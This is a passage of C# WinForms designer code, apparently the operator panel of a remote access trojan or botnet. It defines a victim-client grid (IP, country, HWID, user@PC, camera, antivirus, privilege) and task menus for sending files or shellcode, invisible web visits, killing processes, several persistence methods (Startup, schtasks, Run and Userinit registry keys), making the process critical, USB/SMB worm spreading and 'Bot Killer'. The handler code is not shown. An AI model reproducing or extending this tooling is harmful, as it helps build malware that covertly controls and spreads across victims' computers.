		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridClients.DefaultCellStyle = dataGridViewCellStyle2;
		this.GridClients.Dock = System.Windows.Forms.DockStyle.Fill;
		this.GridClients.EnableHeadersVisualStyles = false;
		this.GridClients.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridClients.Location = new System.Drawing.Point(3, 3);
		this.GridClients.Name = "GridClients";
		this.GridClients.ReadOnly = true;
		this.GridClients.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridClients.RowHeadersDefaultCellStyle = dataGridViewCellStyle3;
		this.GridClients.RowHeadersVisible = false;
		this.GridClients.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridClients.ShowCellErrors = false;
		this.GridClients.ShowCellToolTips = false;
		this.GridClients.ShowEditingIcon = false;
		this.GridClients.ShowRowErrors = false;
		this.GridClients.Size = new System.Drawing.Size(1389, 475);
		this.GridClients.TabIndex = 9;
		this.Column4.HeaderText = "";
		this.Column4.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Stretch;
		this.Column4.MinimumWidth = 40;
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		this.Column4.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.Column4.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.Automatic;
		this.Column4.Width = 40;
		this.ColumnIP.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnIP.HeaderText = "IP";
		this.ColumnIP.MinimumWidth = 120;
		this.ColumnIP.Name = "ColumnIP";
		this.ColumnIP.ReadOnly = true;
		this.ColumnIP.Width = 120;
		this.ColumnCountry.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnCountry.HeaderText = "Country";
		this.ColumnCountry.MinimumWidth = 70;
		this.ColumnCountry.Name = "ColumnCountry";
		this.ColumnCountry.ReadOnly = true;
		this.ColumnCountry.Width = 72;
		this.ColumnGroup.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnGroup.HeaderText = "Group";
		this.ColumnGroup.MinimumWidth = 70;
		this.ColumnGroup.Name = "ColumnGroup";
		this.ColumnGroup.ReadOnly = true;
		this.ColumnGroup.Width = 70;
		this.Column6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column6.HeaderText = "Note";
		this.Column6.MinimumWidth = 50;
		this.Column6.Name = "Column6";
		this.Column6.ReadOnly = true;
		this.Column6.Width = 56;
		this.ColumnHwid.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnHwid.HeaderText = "Hwid";
		this.ColumnHwid.MinimumWidth = 250;
		this.ColumnHwid.Name = "ColumnHwid";
		this.ColumnHwid.ReadOnly = true;
		this.ColumnHwid.Width = 250;
		this.ColumnUserPC.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnUserPC.HeaderText = "UserName @ Pc";
		this.ColumnUserPC.MinimumWidth = 150;
		this.ColumnUserPC.Name = "ColumnUserPC";
		this.ColumnUserPC.ReadOnly = true;
		this.ColumnUserPC.Width = 150;
		this.ColumnCamera.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnCamera.HeaderText = "Camera";
		this.ColumnCamera.MinimumWidth = 120;
		this.ColumnCamera.Name = "ColumnCamera";
		this.ColumnCamera.ReadOnly = true;
		this.ColumnCamera.Width = 120;
		this.ColumnCpu.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnCpu.HeaderText = "Cpu";
		this.ColumnCpu.Name = "ColumnCpu";
		this.ColumnCpu.ReadOnly = true;
		this.ColumnCpu.Width = 53;
		this.ColumnGpu.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnGpu.HeaderText = "Gpu";
		this.ColumnGpu.Name = "ColumnGpu";
		this.ColumnGpu.ReadOnly = true;
		this.ColumnGpu.Width = 53;
		this.ColumnOs.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnOs.HeaderText = "Windows";
		this.ColumnOs.MinimumWidth = 100;
		this.ColumnOs.Name = "ColumnOs";
		this.ColumnOs.ReadOnly = true;
		this.ColumnAntiVirus.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.ColumnAntiVirus.HeaderText = "AntiVirus";
		this.ColumnAntiVirus.Name = "ColumnAntiVirus";
		this.ColumnAntiVirus.ReadOnly = true;
		this.ColumnAntiVirus.Width = 78;
		this.ColumnVersion.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnVersion.HeaderText = "Version";
		this.ColumnVersion.MinimumWidth = 50;
		this.ColumnVersion.Name = "ColumnVersion";
		this.ColumnVersion.ReadOnly = true;
		this.ColumnVersion.Width = 50;
		this.ColumnTimeInstall.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnTimeInstall.HeaderText = "Time Install";
		this.ColumnTimeInstall.MinimumWidth = 100;
		this.ColumnTimeInstall.Name = "ColumnTimeInstall";
		this.ColumnTimeInstall.ReadOnly = true;
		this.ColumnPrivilege.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnPrivilege.HeaderText = "Privilege";
		this.ColumnPrivilege.MinimumWidth = 60;
		this.ColumnPrivilege.Name = "ColumnPrivilege";
		this.ColumnPrivilege.ReadOnly = true;
		this.ColumnPrivilege.Width = 60;
		this.ColumnPing.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		this.ColumnPing.HeaderText = "Ping";
		this.ColumnPing.MinimumWidth = 55;
		this.ColumnPing.Name = "ColumnPing";
		this.ColumnPing.ReadOnly = true;
		this.ColumnPing.Width = 55;
		this.ColumnWindow.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.ColumnWindow.HeaderText = "Window";
		this.ColumnWindow.MinimumWidth = 300;
		this.ColumnWindow.Name = "ColumnWindow";
		this.ColumnWindow.ReadOnly = true;
		this.tabPage2.Controls.Add(this.GridLogs);
		this.tabPage2.Location = new System.Drawing.Point(4, 22);
		this.tabPage2.Name = "tabPage2";
		this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage2.Size = new System.Drawing.Size(1395, 481);
		this.tabPage2.TabIndex = 1;
		this.tabPage2.Text = "Logs";
		this.tabPage2.UseVisualStyleBackColor = true;
		this.GridLogs.AllowUserToAddRows = false;
		this.GridLogs.AllowUserToDeleteRows = false;
		this.GridLogs.AllowUserToResizeColumns = false;
		this.GridLogs.AllowUserToResizeRows = false;
		this.GridLogs.BackgroundColor = System.Drawing.Color.White;
		this.GridLogs.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.GridLogs.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.GridLogs.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridLogs.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.GridLogs.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.GridLogs.Columns.AddRange(this.Column1, this.Column2, this.Column3);
		this.GridLogs.ContextMenuStrip = this.contextMenuStrip2;
		this.GridLogs.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.GridLogs.DefaultCellStyle = dataGridViewCellStyle5;
		this.GridLogs.Dock = System.Windows.Forms.DockStyle.Fill;
		this.GridLogs.EnableHeadersVisualStyles = false;
		this.GridLogs.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.GridLogs.Location = new System.Drawing.Point(3, 3);
		this.GridLogs.Name = "GridLogs";
		this.GridLogs.ReadOnly = true;
		this.GridLogs.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle6.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.GridLogs.RowHeadersDefaultCellStyle = dataGridViewCellStyle6;
		this.GridLogs.RowHeadersVisible = false;
		this.GridLogs.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.GridLogs.ShowCellErrors = false;
		this.GridLogs.ShowCellToolTips = false;
		this.GridLogs.ShowEditingIcon = false;
		this.GridLogs.ShowRowErrors = false;
		this.GridLogs.Size = new System.Drawing.Size(1389, 475);
		this.GridLogs.TabIndex = 10;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column1.HeaderText = "Client";
		this.Column1.MinimumWidth = 300;
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column1.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.Column1.Width = 300;
		this.Column2.HeaderText = "Time";
		this.Column2.MinimumWidth = 120;
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column2.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.Column2.Width = 120;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column3.HeaderText = "Message";
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column3.SortMode = System.Windows.Forms.DataGridViewColumnSortMode.NotSortable;
		this.contextMenuStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.clearToolStripMenuItem });
		this.contextMenuStrip2.Name = "contextMenuStrip2";
		this.contextMenuStrip2.Size = new System.Drawing.Size(102, 26);
		this.clearToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("clearToolStripMenuItem.Image");
		this.clearToolStripMenuItem.Name = "clearToolStripMenuItem";
		this.clearToolStripMenuItem.Size = new System.Drawing.Size(101, 22);
		this.clearToolStripMenuItem.Text = "Clear";
		this.clearToolStripMenuItem.Click += new System.EventHandler(clearToolStripMenuItem_Click);
		this.tabPage3.Controls.Add(this.dataGridView2);
		this.tabPage3.Location = new System.Drawing.Point(4, 22);
		this.tabPage3.Name = "tabPage3";
		this.tabPage3.Padding = new System.Windows.Forms.Padding(3);
		this.tabPage3.Size = new System.Drawing.Size(1395, 481);
		this.tabPage3.TabIndex = 2;
		this.tabPage3.Text = "Tasks";
		this.tabPage3.UseVisualStyleBackColor = true;
		this.dataGridView2.AllowUserToAddRows = false;
		this.dataGridView2.AllowUserToDeleteRows = false;
		this.dataGridView2.AllowUserToResizeColumns = false;
		this.dataGridView2.AllowUserToResizeRows = false;
		this.dataGridView2.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView2.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
		this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView2.Columns.AddRange(this.Column5, this.TS_Runs, this.TS_Name);
		this.dataGridView2.ContextMenuStrip = this.contextMenuStrip3;
		this.dataGridView2.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle8.Font = new System.Drawing.Font("Arial", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.Purple;
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle8;
		this.dataGridView2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dataGridView2.EnableHeadersVisualStyles = false;
		this.dataGridView2.GridColor = System.Drawing.Color.White;
		this.dataGridView2.Location = new System.Drawing.Point(3, 3);
		this.dataGridView2.Name = "dataGridView2";
		this.dataGridView2.ReadOnly = true;
		this.dataGridView2.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle9.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
		this.dataGridView2.RowHeadersVisible = false;
		this.dataGridView2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView2.ShowCellErrors = false;
		this.dataGridView2.ShowCellToolTips = false;
		this.dataGridView2.ShowEditingIcon = false;
		this.dataGridView2.ShowRowErrors = false;
		this.dataGridView2.Size = new System.Drawing.Size(1389, 475);
		this.dataGridView2.TabIndex = 11;
		this.Column5.HeaderText = "Run Once";
		this.Column5.Name = "Column5";
		this.Column5.ReadOnly = true;
		this.TS_Runs.HeaderText = "Runs";
		this.TS_Runs.MinimumWidth = 50;
		this.TS_Runs.Name = "TS_Runs";
		this.TS_Runs.ReadOnly = true;
		this.TS_Name.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.TS_Name.HeaderText = "Name";
		this.TS_Name.Name = "TS_Name";
		this.TS_Name.ReadOnly = true;
		this.contextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.toolStripMenuItem41, this.toolStripMenuItem35, this.toolStripMenuItem86, this.toolStripMenuItem95, this.sToolStripMenuItem11, this.removeToolStripMenuItem, this.renameToolStripMenuItem, this.runOnceRunAllToolStripMenuItem });
		this.contextMenuStrip3.Name = "contextMenuStripTasks";
		this.contextMenuStrip3.Size = new System.Drawing.Size(164, 164);
		this.toolStripMenuItem41.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.toolStripMenuItem74, this.toolStripSeparator7, this.toolStripMenuItem81, this.toolStripMenuItem39, this.toolStripMenuItem117, this.toolStripMenuItem79 });
		this.toolStripMenuItem41.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem41.Image");
		this.toolStripMenuItem41.Name = "toolStripMenuItem41";
		this.toolStripMenuItem41.Size = new System.Drawing.Size(163, 22);
		this.toolStripMenuItem41.Text = "Control";
		this.toolStripMenuItem74.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.toolStripMenuItem75, this.toolStripMenuItem76, this.toolStripMenuItem77, this.toolStripMenuItem78 });
		this.toolStripMenuItem74.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem74.Image");
		this.toolStripMenuItem74.Name = "toolStripMenuItem74";
		this.toolStripMenuItem74.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem74.Text = "Send File";
		this.toolStripMenuItem75.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem75.Image");
		this.toolStripMenuItem75.Name = "toolStripMenuItem75";
		this.toolStripMenuItem75.Size = new System.Drawing.Size(150, 22);
		this.toolStripMenuItem75.Text = "From Disk";
		this.toolStripMenuItem75.Click += new System.EventHandler(toolStripMenuItem75_Click);
		this.toolStripMenuItem76.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem76.Image");
		this.toolStripMenuItem76.Name = "toolStripMenuItem76";
		this.toolStripMenuItem76.Size = new System.Drawing.Size(150, 22);
		this.toolStripMenuItem76.Text = "From Memory";
		this.toolStripMenuItem76.Click += new System.EventHandler(toolStripMenuItem76_Click);
		this.toolStripMenuItem77.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem77.Image");
		this.toolStripMenuItem77.Name = "toolStripMenuItem77";
		this.toolStripMenuItem77.Size = new System.Drawing.Size(150, 22);
		this.toolStripMenuItem77.Text = "From Link";
		this.toolStripMenuItem77.Click += new System.EventHandler(toolStripMenuItem77_Click);
		this.toolStripMenuItem78.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem78.Image");
		this.toolStripMenuItem78.Name = "toolStripMenuItem78";
		this.toolStripMenuItem78.Size = new System.Drawing.Size(150, 22);
		this.toolStripMenuItem78.Text = "Shell Code";
		this.toolStripMenuItem78.Click += new System.EventHandler(toolStripMenuItem78_Click);
		this.toolStripSeparator7.Name = "toolStripSeparator7";
		this.toolStripSeparator7.Size = new System.Drawing.Size(153, 6);
		this.toolStripMenuItem81.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem82, this.toolStripMenuItem83 });
		this.toolStripMenuItem81.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem81.Image");
		this.toolStripMenuItem81.Name = "toolStripMenuItem81";
		this.toolStripMenuItem81.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem81.Text = "Web Site";
		this.toolStripMenuItem82.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem82.Image");
		this.toolStripMenuItem82.Name = "toolStripMenuItem82";
		this.toolStripMenuItem82.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem82.Text = "Visble";
		this.toolStripMenuItem82.Click += new System.EventHandler(toolStripMenuItem82_Click);
		this.toolStripMenuItem83.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem83.Image");
		this.toolStripMenuItem83.Name = "toolStripMenuItem83";
		this.toolStripMenuItem83.Size = new System.Drawing.Size(117, 22);
		this.toolStripMenuItem83.Text = "Invisible";
		this.toolStripMenuItem83.Click += new System.EventHandler(toolStripMenuItem83_Click);
		this.toolStripMenuItem39.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripMenuItem84, this.toolStripMenuItem85 });
		this.toolStripMenuItem39.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem39.Image");
		this.toolStripMenuItem39.Name = "toolStripMenuItem39";
		this.toolStripMenuItem39.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem39.Text = "Anti process";
		this.toolStripMenuItem84.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem84.Image");
		this.toolStripMenuItem84.Name = "toolStripMenuItem84";
		this.toolStripMenuItem84.Size = new System.Drawing.Size(101, 22);
		this.toolStripMenuItem84.Text = "Kill";
		this.toolStripMenuItem84.Click += new System.EventHandler(toolStripMenuItem84_Click);
		this.toolStripMenuItem85.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem85.Image");
		this.toolStripMenuItem85.Name = "toolStripMenuItem85";
		this.toolStripMenuItem85.Size = new System.Drawing.Size(101, 22);
		this.toolStripMenuItem85.Text = "Dead";
		this.toolStripMenuItem85.Click += new System.EventHandler(toolStripMenuItem85_Click);
		this.toolStripMenuItem117.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem117.Image");
		this.toolStripMenuItem117.Name = "toolStripMenuItem117";
		this.toolStripMenuItem117.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem117.Text = "Report Window";
		this.toolStripMenuItem117.Click += new System.EventHandler(toolStripMenuItem117_Click);
		this.toolStripMenuItem79.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem79.Image");
		this.toolStripMenuItem79.Name = "toolStripMenuItem79";
		this.toolStripMenuItem79.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem79.Text = "Fast run";
		this.toolStripMenuItem79.Click += new System.EventHandler(toolStripMenuItem79_Click);
		this.toolStripMenuItem35.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[25]
		{
			this.toolStripMenuItem107, this.processCriticalToolStripMenuItem, this.toolStripMenuItem36, this.toolStripMenuItem37, this.toolStripMenuItem38, this.toolStripMenuItem101, this.toolStripSeparator3, this.toolStripMenuItem40, this.toolStripMenuItem42, this.toolStripSeparator4,
			this.toolStripMenuItem43, this.toolStripMenuItem44, this.toolStripMenuItem45, this.toolStripMenuItem46, this.toolStripSeparator5, this.toolStripMenuItem47, this.toolStripMenuItem50, this.toolStripMenuItem53, this.toolStripMenuItem56, this.toolStripSeparator6,
			this.toolStripMenuItem59, this.toolStripMenuItem62, this.toolStripMenuItem65, this.toolStripMenuItem68, this.toolStripMenuItem71
		});
		this.toolStripMenuItem35.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem35.Image");
		this.toolStripMenuItem35.Name = "toolStripMenuItem35";
		this.toolStripMenuItem35.Size = new System.Drawing.Size(163, 22);
		this.toolStripMenuItem35.Text = "Action";
		this.toolStripMenuItem107.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[6] { this.toolStripMenuItem108, this.toolStripMenuItem109, this.toolStripMenuItem110, this.toolStripMenuItem111, this.toolStripMenuItem112, this.toolStripMenuItem113 });
		this.toolStripMenuItem107.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem107.Image");
		this.toolStripMenuItem107.Name = "toolStripMenuItem107";
		this.toolStripMenuItem107.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem107.Text = "Auto Run";
		this.toolStripMenuItem108.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem108.Image");
		this.toolStripMenuItem108.Name = "toolStripMenuItem108";
		this.toolStripMenuItem108.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem108.Text = "Startup";
		this.toolStripMenuItem108.Click += new System.EventHandler(toolStripMenuItem108_Click);
		this.toolStripMenuItem109.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem109.Image");
		this.toolStripMenuItem109.Name = "toolStripMenuItem109";
		this.toolStripMenuItem109.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem109.Text = "Schtask";
		this.toolStripMenuItem109.Click += new System.EventHandler(toolStripMenuItem109_Click);
		this.toolStripMenuItem110.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem110.Image");
		this.toolStripMenuItem110.Name = "toolStripMenuItem110";
		this.toolStripMenuItem110.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem110.Text = "Schtask highest";
		this.toolStripMenuItem110.Click += new System.EventHandler(toolStripMenuItem110_Click);
		this.toolStripMenuItem111.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem111.Image");
		this.toolStripMenuItem111.Name = "toolStripMenuItem111";
		this.toolStripMenuItem111.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem111.Text = "Reg user";
		this.toolStripMenuItem111.Click += new System.EventHandler(toolStripMenuItem111_Click);
		this.toolStripMenuItem112.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem112.Image");
		this.toolStripMenuItem112.Name = "toolStripMenuItem112";
		this.toolStripMenuItem112.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem112.Text = "Reg machine";
		this.toolStripMenuItem112.Click += new System.EventHandler(toolStripMenuItem112_Click);
		this.toolStripMenuItem113.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem113.Image");
		this.toolStripMenuItem113.Name = "toolStripMenuItem113";
		this.toolStripMenuItem113.Size = new System.Drawing.Size(156, 22);
		this.toolStripMenuItem113.Text = "Reg userinit";
		this.toolStripMenuItem113.Click += new System.EventHandler(toolStripMenuItem113_Click);
		this.processCriticalToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.setCriticalToolStripMenuItem, this.exitCriticalToolStripMenuItem });
		this.processCriticalToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("processCriticalToolStripMenuItem.Image");
		this.processCriticalToolStripMenuItem.Name = "processCriticalToolStripMenuItem";
		this.processCriticalToolStripMenuItem.Size = new System.Drawing.Size(182, 22);
		this.processCriticalToolStripMenuItem.Text = "Process Critical";
		this.setCriticalToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("setCriticalToolStripMenuItem.Image");
		this.setCriticalToolStripMenuItem.Name = "setCriticalToolStripMenuItem";
		this.setCriticalToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
		this.setCriticalToolStripMenuItem.Text = "Set Critical";
		this.setCriticalToolStripMenuItem.Click += new System.EventHandler(setCriticalToolStripMenuItem_Click);
		this.exitCriticalToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("exitCriticalToolStripMenuItem.Image");
		this.exitCriticalToolStripMenuItem.Name = "exitCriticalToolStripMenuItem";
		this.exitCriticalToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
		this.exitCriticalToolStripMenuItem.Text = "Exit Critical";
		this.exitCriticalToolStripMenuItem.Click += new System.EventHandler(exitCriticalToolStripMenuItem_Click);
		this.toolStripMenuItem36.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem36.Image");
		this.toolStripMenuItem36.Name = "toolStripMenuItem36";
		this.toolStripMenuItem36.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem36.Text = "Worm (usb/smb)";
		this.toolStripMenuItem36.Click += new System.EventHandler(toolStripMenuItem36_Click);
		this.toolStripMenuItem37.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem37.Image");
		this.toolStripMenuItem37.Name = "toolStripMenuItem37";
		this.toolStripMenuItem37.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem37.Text = "Stealth Saver";
		this.toolStripMenuItem37.Click += new System.EventHandler(toolStripMenuItem37_Click);
		this.toolStripMenuItem38.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem38.Image");
		this.toolStripMenuItem38.Name = "toolStripMenuItem38";
		this.toolStripMenuItem38.Size = new System.Drawing.Size(182, 22);
		this.toolStripMenuItem38.Text = "Bot Killer";
